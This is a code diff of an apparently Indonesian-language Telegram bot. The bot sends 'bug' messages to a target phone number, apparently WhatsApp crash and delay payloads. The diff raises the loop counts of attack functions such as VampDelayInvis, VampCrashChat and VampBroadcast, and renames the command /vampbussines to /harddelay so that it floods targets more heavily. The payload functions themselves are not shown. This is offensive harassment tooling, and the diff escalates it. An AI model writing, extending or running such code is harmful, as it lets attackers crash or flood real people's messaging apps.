@@ -1120,32 +1120,7 @@ async function VampOri(target) {
 
 }
 async function VampDelayInvis(target) {
-    for (let i = 0; i <= 5; i++) {
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
+    for (let i = 0; i <= 100; i++) {
     await VampBroadcast(target, mention = true)
     await VampBroadcast(target, mention = true)
     await VampBroadcast(target, mention = true)
@@ -1179,6 +1154,10 @@ async function VampBeta(target) {
 }
 async function VampCrashChat(target) {
     for (let i = 0; i <= 100; i++) {
+    await VampDelayMess(target, Ptcp = true)
+    await VampDelayMess(target, Ptcp = true)
+    await VampDelayMess(target, Ptcp = true)
+    await VampDelayMess(target, Ptcp = true)
     await VampDelayMess(target, Ptcp = true)
     await VampDelayMess(target, Ptcp = true)
     await VampDelayMess(target, Ptcp = true)
@@ -1535,7 +1514,7 @@ bot.onText(/\/vampbeta(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/vampbussines(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/harddelay(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1566,9 +1545,17 @@ bot.onText(/\/vampbussines(?:\s(.+))?/, async (msg, match) => {
     });
 
     // Proses pengiriman bug
-    for (let i = 0; i < 2; i++) { // Kirim 3 kali langsung
-        await VampCrashUi(formatedNumber);
-        await VampDelayInvis(formatedNumber);
+    for (let i = 0; i < 20; i++) { // Kirim 3 kali langsung
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
@@ -1659,6 +1646,7 @@ bot.onText(/\/delay(?:\s(.+))?/, async (msg, match) => {
     });
 
     for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
+        await VampDelayInvis(formatedNumber);
         await VampDelayInvis(formatedNumber);
     }
 
